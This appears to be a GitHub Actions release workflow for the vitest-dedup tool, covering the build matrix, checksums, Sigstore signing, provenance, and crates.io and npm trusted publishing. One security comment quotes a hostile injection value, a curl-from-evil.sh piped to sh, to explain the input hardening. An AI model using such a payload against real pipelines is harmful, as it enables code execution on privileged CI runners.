name: Release

on:
  workflow_dispatch:
    inputs:
      version:
        description: Version to build, without the leading v
        required: true
        default: 0.7.0
      publish:
        description: Publish GitHub release and configured registries; false rehearses
        type: boolean
        default: false
      publish_npm_only:
        description: Recover npm packages without recreating the GitHub release or crate
        type: boolean
        default: false

permissions:
  contents: read

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

env:
  CARGO_TERM_COLOR: always

jobs:
  resolve:
    name: Resolve version and matrix
    runs-on: ubuntu-22.04
    timeout-minutes: 5
    outputs:
      version: ${{ steps.version.outputs.version }}
      matrix: ${{ steps.matrix.outputs.matrix }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
        with:
          ref: ${{ github.sha }}
          persist-credentials: false
          fetch-depth: 0
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7
        with:
          node-version: 24
      # SECURITY: `inputs.version` is attacker-controllable (anyone who can trigger workflow_dispatch
      # chooses it) and this job holds `contents: write`. It must never be spliced into a `run:`
      # script via `${{ }}` -- GitHub expands that *before* the shell sees it, so a value like
      # `" ; curl evil.sh | sh #` would close the quote and execute. Passing it through `env:` makes
      # it reach the shell as inert data (a variable value), never as script text. It is also
      # strictly validated below before anything downstream trusts it: not just for injection, but
      # because this version is later spliced into artifact filenames, a release tag, and a git ref.
      - id: version
        shell: bash
        env:
          EVENT_NAME: ${{ github.event_name }}
          INPUT_VERSION: ${{ inputs.version }}
        run: |
          set -euo pipefail
          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
            version="$INPUT_VERSION"
          else
            version="${GITHUB_REF_NAME#v}"
          fi
          if ! [[ "$version" =~ ^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$ ]]; then
            # Deliberately not echoing the raw value into this annotation: it just failed
            # validation, so it may be exactly the kind of malformed/hostile string this check
            # exists to catch, and workflow-command annotations are themselves injectable via
            # embedded newlines.
            echo "::error::version input does not match the required <major>.<minor>.<patch>[-prerelease] format"
            exit 1
          fi
          echo "version=$version" >> "$GITHUB_OUTPUT"
      # A publish dispatch must start on an existing tag at the exact commit being built. A branch
      # dispatch is still allowed for artifact-only rehearsals.
      - name: Verify publication context
        shell: bash
        env:
          PUBLISH_RELEASE: ${{ inputs.publish }}
          PUBLISH_NPM_ONLY: ${{ inputs.publish_npm_only }}
          RELEASE_VERSION: ${{ steps.version.outputs.version }}
          EVENT_REF: ${{ github.ref }}
          EVENT_SHA: ${{ github.sha }}
        run: |
          set -euo pipefail
          release_sha=$(git rev-parse HEAD)
          tag_sha=""
          if [ "$PUBLISH_RELEASE" = "true" ]; then
            tag_sha=$(git rev-parse --verify "refs/tags/v${RELEASE_VERSION}^{commit}")
          fi
          PUBLISH_RELEASE="$PUBLISH_RELEASE" RELEASE_TAG="v$RELEASE_VERSION" \
            PUBLISH_NPM_ONLY="$PUBLISH_NPM_ONLY" \
            EVENT_REF="$EVENT_REF" EVENT_SHA="$EVENT_SHA" \
            RELEASE_SHA="$release_sha" TAG_SHA="$tag_sha" \
            node scripts/release/validate-release-context.mjs
      - name: Verify live release tag is merged into main
        if: inputs.publish
        env:
          PUBLISH_RELEASE: "true"
          RELEASE_TAG: v${{ steps.version.outputs.version }}
          EVENT_REF: ${{ github.ref }}
          EVENT_SHA: ${{ github.sha }}
        run: RELEASE_SHA=$(git rev-parse HEAD) node scripts/release/validate-release-context.mjs --remote
      # The tag and Cargo.toml must agree. A release whose binary reports a different version than
      # its tag is the kind of thing nobody notices until someone is debugging production.
      - name: Verify Cargo.toml matches the tag
        shell: bash
        env:
          RELEASE_VERSION: ${{ steps.version.outputs.version }}
        run: |
          set -euo pipefail
          manifest=$(grep -m1 '^version = ' Cargo.toml | cut -d'"' -f2)
          if [ "$manifest" != "$RELEASE_VERSION" ]; then
            echo "::error::Cargo.toml is $manifest but the release is $RELEASE_VERSION"
            exit 1
          fi
      - name: Verify existing release for npm-only recovery
        if: inputs.publish_npm_only
        env:
          RELEASE_TAG: v${{ steps.version.outputs.version }}
          GH_TOKEN: ${{ github.token }}
          GH_REPO: ${{ github.repository }}
        run: node scripts/release/check-recovery-release.mjs
      # The platform matrix is derived from prebuilt-targets.json so the build, the npm packages,
      # and the Action can never disagree about which platforms exist.
      - id: matrix
        run: |
          node --input-type=module -e '
            const { TARGETS } = await import("./npm/lib/targets.mjs");
            const include = Object.entries(TARGETS).map(([key, t]) => ({
              key, runner: t.runner, rustTarget: t.rustTarget, binaryName: t.binaryName,
            }));
            console.log(`matrix=${JSON.stringify({ include })}`);
          ' >> "$GITHUB_OUTPUT"

  build:
    name: Build ${{ matrix.key }}
    needs: resolve
    runs-on: ${{ matrix.runner }}
    strategy:
      fail-fast: false
      max-parallel: 6
      matrix: ${{ fromJSON(needs.resolve.outputs.matrix) }}
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
        with:
          ref: ${{ github.sha }}
          persist-credentials: false
      - uses: dtolnay/rust-toolchain@b725eda525362e7cf34af9a7243cac1e3f01a7ec # stable
      # rust-toolchain.toml overrides the action's default `stable` inside this checkout. Install
      # the target into that active toolchain, which is the one `cargo build` actually invokes.
      - name: Install target for repository toolchain
        shell: bash
        env:
          RUST_TARGET: ${{ matrix.rustTarget }}
        run: rustup target add "$RUST_TARGET"
      - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2
        with:
          key: ${{ matrix.rustTarget }}
      - name: Install musl tooling
        if: contains(matrix.rustTarget, 'musl')
        run: |
          sudo apt-get update
          sudo apt-get install -y musl-tools
      - shell: bash
        env:
          RUST_TARGET: ${{ matrix.rustTarget }}
        run: cargo build --release --locked --target "$RUST_TARGET"
      - name: Package
        shell: bash
        env:
          VERSION: ${{ needs.resolve.outputs.version }}
          TARGET_KEY: ${{ matrix.key }}
          RUST_TARGET: ${{ matrix.rustTarget }}
          BINARY_NAME: ${{ matrix.binaryName }}
        run: |
          set -euo pipefail
          name="vitest-dedup-${VERSION}-${TARGET_KEY}"
          mkdir -p "dist/$name"
          cp "target/${RUST_TARGET}/release/${BINARY_NAME}" "dist/$name/"
          cp README.md LICENSE "dist/$name/" 2>/dev/null || true
          cd dist
          tar -czf "$name.tar.gz" "$name"
          # The Action verifies this digest before executing the binary, so it must be produced
          # here, alongside the artifact, and never regenerated later from an untrusted copy.
          if command -v sha256sum >/dev/null; then
            sha256sum "$name.tar.gz" > "$name.tar.gz.sha256"
          else
            shasum -a 256 "$name.tar.gz" > "$name.tar.gz.sha256"
          fi
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7
        with:
          name: release-${{ matrix.key }}
          path: dist/*.tar.gz*
          if-no-files-found: error
      # The raw, unarchived binary, for the npm platform packages. It is uploaded separately rather
      # than re-extracted from the archive so the npm job can prove, by digest, that the two are the
      # same file -- see scripts/release/verify-npm-binaries.mjs. `compression-level: 0` because the
      # artifact store would otherwise spend minutes recompressing an already-stripped executable.
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7
        with:
          name: binary-${{ matrix.rustTarget }}
          path: target/${{ matrix.rustTarget }}/release/${{ matrix.binaryName }}
          if-no-files-found: error
          compression-level: 0

  # Runs the recall corpus through the candidate build and through the previous published release's
  # Linux binary, and keeps the result: a section for the release notes and the full per-case
  # detail. It is not skipped on a failure -- a comparison that cannot be produced stops
  # `publish`, so the notes can never carry a comparison that was not made. Regressions are
  # reported, not blocking: whether to ship them is the releaser's call. An npm-only recovery
  # does not run it and so never touches the release notes.
  compare:
    name: Compare with the previous release
    needs: [resolve, build]
    if: inputs.publish_npm_only != true
    runs-on: ubuntu-22.04
    timeout-minutes: 20
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
        with:
          ref: ${{ github.sha }}
          persist-credentials: false
          fetch-depth: 0
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7
        with:
          node-version: 24
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8
        with:
          name: binary-x86_64-unknown-linux-gnu
          path: native
      - name: Compare with the previous release
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
          GH_REPO: ${{ github.repository }}
          VERSION: ${{ needs.resolve.outputs.version }}
        run: |
          set -euo pipefail
          chmod +x native/vitest-dedup
          node scripts/release/release-comparison.mjs compare \
            --version "$VERSION" --binary native/vitest-dedup --out release-comparison
          cat release-comparison/comparison.md >> "$GITHUB_STEP_SUMMARY"
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7
        with:
          name: corpus-comparison
          path: release-comparison/
          if-no-files-found: error

  # A manual dispatch defaults to an artifact-producing rehearsal. It exercises the same build
  # matrix as publication, then verifies and packs the downloaded outputs without creating a tag,
  # GitHub Release or npm version.
  rehearse:
    name: Rehearse release artifacts
    needs: [resolve, build, compare]
    if: inputs.publish != true
    runs-on: ubuntu-22.04
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
        with:
          ref: ${{ github.sha }}
          persist-credentials: false
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7
        with:
          node-version: 24
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8
        with:
          pattern: binary-*
          path: native
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8
        with:
          pattern: release-*
          path: release-assets
          merge-multiple: true
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8
        with:
          name: corpus-comparison
          path: release-comparison
      - name: Show the release-notes comparison section
        run: |
          test -s release-comparison/notes-section.md
          cat release-comparison/notes-section.md
      - name: Verify versions and binary identity
        env:
          EXPECTED_VERSION: ${{ needs.resolve.outputs.version }}
          RELEASE_TAG: v${{ needs.resolve.outputs.version }}
        run: |
          node scripts/release/check-release-version.mjs
          node scripts/release/verify-npm-binaries.mjs \
            --binaries native --archives release-assets --version "$EXPECTED_VERSION"
      - name: Install and run the packed host distribution
        env:
          VITEST_DEDUP_REQUIRE_INSTALL_SIM: "1"
        run: |
          mkdir -p target/release
          cp native/binary-x86_64-unknown-linux-gnu/vitest-dedup target/release/vitest-dedup
          node --test npm/test/install-simulation.test.mjs
      - name: Pack every npm package
        run: |
          node scripts/release/prepare-npm-packages.mjs native
          node scripts/release/check-release-version.mjs
          mkdir -p rehearsal-packages
          for package in npm/platforms/* .; do
            npm pack "$package" --pack-destination rehearsal-packages --json > /dev/null
          done
          expected=$(find npm/platforms -mindepth 1 -maxdepth 1 -type d | wc -l)
          actual=$(find rehearsal-packages -maxdepth 1 -name '*.tgz' | wc -l)
          test "$actual" -eq "$((expected + 1))"
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7
        with:
          name: npm-rehearsal-packages
          path: rehearsal-packages/*.tgz
          if-no-files-found: error

  publish:
    name: Publish release
    needs: [resolve, build, compare]
    if: inputs.publish == true && !inputs.publish_npm_only
    runs-on: ubuntu-22.04
    timeout-minutes: 20
    environment: github-release
    permissions:
      contents: write
      id-token: write
      attestations: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
        with:
          ref: ${{ github.sha }}
          fetch-depth: 0
          persist-credentials: false
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7
        with:
          node-version: 24
          package-manager-cache: false
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8
        with:
          pattern: release-*
          path: artifacts
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8
        with:
          name: corpus-comparison
          path: release-comparison
      - name: Collect and verify
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p dist
          find artifacts -type f -name '*.tar.gz*' -exec cp {} dist/ \;
          cd dist
          # Re-verify every digest before publishing. A corrupted upload that ships with a matching
          # but wrong checksum would be verified successfully by every consumer.
          for sum in *.sha256; do sha256sum -c "$sum"; done
          cat *.sha256 > SHA256SUMS
          expected=$(node --input-type=module -e '
            const { TARGETS } = await import("../npm/lib/targets.mjs");
            console.log(Object.keys(TARGETS).length);
          ')
          actual=$(ls -1 *.tar.gz | wc -l | tr -d ' ')
          if [ "$expected" != "$actual" ]; then
            echo "::error::expected $expected platform archives, found $actual"
            exit 1
          fi
      - name: Install cosign
        uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4
      - name: Sign archives and checksums with keyless Sigstore
        shell: bash
        run: |
          set -euo pipefail
          for asset in dist/*.tar.gz dist/*.sha256; do
            test -f "$asset" || continue
            cosign sign-blob --yes --bundle "${asset}.sigstore.json" "$asset"
          done
      # The checksums travel with the artifacts and therefore cannot vouch for their origin -- a
      # pipeline that can publish a bad binary can publish a matching digest. This attestation is
      # signed by GitHub's OIDC identity instead of by this workflow's own output, so it is the
      # part a consumer can actually verify independently.
      - id: attest
        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4
        with:
          subject-path: dist/*.tar.gz
      - name: Add provenance bundle to release assets
        shell: bash
        run: cp "${{ steps.attest.outputs.bundle-path }}" dist/vitest-dedup.intoto.jsonl

      # Re-read the remote tag after the build matrix. The resolve job's local tag snapshot may
      # be stale if the tag was moved or deleted while the artifacts were building.
      - name: Revalidate live tag before release creation
        shell: bash
        env:
          PUBLISH_RELEASE: "true"
          RELEASE_TAG: v${{ needs.resolve.outputs.version }}
          EVENT_REF: ${{ github.ref }}
          EVENT_SHA: ${{ github.sha }}
        run: |
          set -euo pipefail
          RELEASE_SHA=$(git rev-parse HEAD) node scripts/release/validate-release-context.mjs --remote
      - uses: softprops/action-gh-release@efb35369e0ad2afab669f228072c1b0d510eae64 # v3
        with:
          tag_name: v${{ needs.resolve.outputs.version }}
          target_commitish: ${{ github.sha }}
          name: v${{ needs.resolve.outputs.version }}
          prerelease: ${{ contains(needs.resolve.outputs.version, '-') }}
          generate_release_notes: true
          files: |
            dist/*.tar.gz
            dist/*.sha256
            dist/*.sigstore.json
            dist/SHA256SUMS
            dist/vitest-dedup.intoto.jsonl
      # The notes were generated by the step above. The comparison section is added to them here
      # rather than passed to that step: it replaces any section an earlier attempt left, so a
      # retried publish ends with exactly one.
      - name: Add the corpus comparison to the release notes
        shell: bash
        env:
          GH_TOKEN: ${{ github.token }}
          GH_REPO: ${{ github.repository }}
          RELEASE_TAG: v${{ needs.resolve.outputs.version }}
        run: |
          set -euo pipefail
          node scripts/release/release-comparison.mjs apply \
            --tag "$RELEASE_TAG" --section release-comparison/notes-section.md

  # The first crate release must be published manually from the immutable tag. Once that crate
  # exists, configure its crates.io trusted publisher for this repository and the crates-io
  # environment, then enable PUBLISH_CRATES. Future releases use a short-lived OIDC token.
  publish-crate:
    name: Publish crate
    needs: [resolve, build, publish]
    if: inputs.publish == true && !inputs.publish_npm_only && vars.PUBLISH_CRATES == 'true'
    runs-on: ubuntu-22.04
    timeout-minutes: 20
    environment: crates-io
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
        with:
          ref: ${{ github.sha }}
          fetch-depth: 0
          persist-credentials: false
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7
        with:
          node-version: 24
          package-manager-cache: false
      - uses: dtolnay/rust-toolchain@b725eda525362e7cf34af9a7243cac1e3f01a7ec # stable
      - name: Revalidate release version and live tag
        shell: bash
        env:
          EXPECTED_VERSION: ${{ needs.resolve.outputs.version }}
          RELEASE_TAG: v${{ needs.resolve.outputs.version }}
          PUBLISH_RELEASE: "true"
          EVENT_REF: ${{ github.ref }}
          EVENT_SHA: ${{ github.sha }}
        run: |
          set -euo pipefail
          node scripts/release/check-release-version.mjs
          RELEASE_SHA=$(git rev-parse HEAD) node scripts/release/validate-release-context.mjs --remote
      - name: Authenticate with crates.io trusted publishing
        id: crates-io-auth
        uses: rust-lang/crates-io-auth-action@c6f97d42243bad5fab37ca0427f495c86d5b1a18 # v1
      - name: Publish crate
        run: cargo publish --locked
        env:
          CARGO_REGISTRY_TOKEN: ${{ steps.crates-io-auth.outputs.token }}

  # ------------------------------------------------------------------------------------------
  # npm distribution
  # ------------------------------------------------------------------------------------------
  #
  # Runs only after the GitHub release exists, because the release is the recoverable step and npm
  # is not: a published version cannot be replaced, and unpublishing is restricted after 72 hours.
  # Gated on the `PUBLISH_NPM` repository variable so that tagging a release does not fail on npm
  # until trusted publishing is configured for these package names on npmjs.com; set it to `true`
  # once it is.
  #
  # Authentication is npm trusted publishing: the job's OIDC identity (`id-token: write`) is
  # exchanged by npm >= 11.5.1 for a short-lived registry credential. There is deliberately no
  # NPM_TOKEN anywhere in this file -- a long-lived token in repository secrets is the credential
  # this design exists to avoid.
  publish-npm:
    name: Publish npm packages
    needs: [resolve, build, publish]
    if: >-
      ${{
        !cancelled() &&
        inputs.publish == true &&
        vars.PUBLISH_NPM == 'true' &&
        needs.resolve.result == 'success' &&
        needs.build.result == 'success' &&
        (inputs.publish_npm_only || needs.publish.result == 'success')
      }}
    runs-on: ubuntu-22.04
    timeout-minutes: 20
    environment: npm
    permissions:
      contents: read
      id-token: write
    env:
      VERSION: ${{ needs.resolve.outputs.version }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
        with:
          ref: ${{ github.sha }}
          fetch-depth: 0
          persist-credentials: false
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7
        with:
          node-version: 24
          package-manager-cache: false
          registry-url: https://registry.npmjs.org
      # Kept unmerged: every target's binary is called `vitest-dedup`, so merging would collapse
      # eight different executables onto one path.
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8
        with:
          pattern: binary-*
          path: native
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8
        if: '!inputs.publish_npm_only'
        with:
          pattern: release-*
          path: release-assets
          merge-multiple: true
      - name: Download existing GitHub Release archives for npm recovery
        if: inputs.publish_npm_only
        env:
          GH_TOKEN: ${{ github.token }}
          GH_REPO: ${{ github.repository }}
        run: gh release download "v$VERSION" --pattern '*.tar.gz*' --dir published-release
      - name: Verify every version site agrees with the tag
        shell: bash
        env:
          EXPECTED_VERSION: ${{ needs.resolve.outputs.version }}
          RELEASE_TAG: v${{ needs.resolve.outputs.version }}
        run: node scripts/release/check-release-version.mjs
      - name: Revalidate live tag before npm publication
        env:
          PUBLISH_RELEASE: "true"
          RELEASE_TAG: v${{ needs.resolve.outputs.version }}
          EVENT_REF: ${{ github.ref }}
          EVENT_SHA: ${{ github.sha }}
        run: RELEASE_SHA=$(git rev-parse HEAD) node scripts/release/validate-release-context.mjs --remote
      # Ties the npm binaries to the attested release archives by digest. Without this, "the
      # release is attested" would say nothing about what npm users receive.
      - name: Verify npm binaries against the checksummed release archives
        shell: bash
        env:
          PUBLISH_NPM_ONLY: ${{ inputs.publish_npm_only }}
        run: |
          set -euo pipefail
          archives=release-assets
          if [ "$PUBLISH_NPM_ONLY" = "true" ]; then archives=published-release; fi
          node scripts/release/verify-npm-binaries.mjs \
            --binaries native --archives "$archives" --version "$VERSION"
      - name: Generate the platform packages
        run: node scripts/release/prepare-npm-packages.mjs native
      - name: Re-verify the generated packages
        run: node scripts/release/check-release-version.mjs
      - name: Confirm npm supports trusted publishing
        run: node scripts/release/check-npm-trusted-publishing.mjs
      # Platform packages first, launcher last, each skipped if already at this version -- so a
      # rerun after a partial failure completes the set instead of conflicting on it.
      - name: Publish platform packages, then the launcher
        run: node scripts/release/publish-npm-packages.mjs

  # ------------------------------------------------------------------------------------------
  # Website
  # ------------------------------------------------------------------------------------------
  #
  # Asks the website repository to rebuild once the release is out. It waits for the registries so
  # the site never advertises a version nobody can install yet, and it cannot block them: a failure
  # here unpublishes nothing, and the job can be re-run on its own. A normal publish triggers it
  # from the GitHub release; an npm-only recovery triggers it once the packages land, because the
  # first run stopped before reaching this job.
  #
  # `SITE_DISPATCH_TOKEN` is a fine-grained personal access token for the website repository only,
  # with `Contents: read and write` (what `repository_dispatch` requires). It is the one long-lived
  # secret in this file, because a cross-repository dispatch cannot use OIDC. It reaches the shell
  # through `env`, never by interpolation into the script.
  notify-site:
    name: Trigger website rebuild
    needs: [resolve, publish, publish-crate, publish-npm]
    if: >-
      ${{
        !cancelled() &&
        inputs.publish == true &&
        (needs.publish.result == 'success' ||
          (inputs.publish_npm_only && needs.publish-npm.result == 'success')) &&
        needs.publish-crate.result != 'failure' &&
        needs.publish-npm.result != 'failure'
      }}
    runs-on: ubuntu-22.04
    timeout-minutes: 5
    permissions: {}
    steps:
      - name: Trigger website rebuild
        shell: bash
        env:
          SITE_DISPATCH_TOKEN: ${{ secrets.SITE_DISPATCH_TOKEN }}
        run: |
          set -euo pipefail
          if [ -z "$SITE_DISPATCH_TOKEN" ]; then
            echo "::error::SITE_DISPATCH_TOKEN is not set; the release is published, so re-run this job once it is"
            exit 1
          fi
          curl -fsS --max-time 30 --retry 3 -X POST \
            -H "Authorization: Bearer $SITE_DISPATCH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/figueiredoluiz/vitest-dedup-site/dispatches \
            -d '{"event_type":"release-published"}'
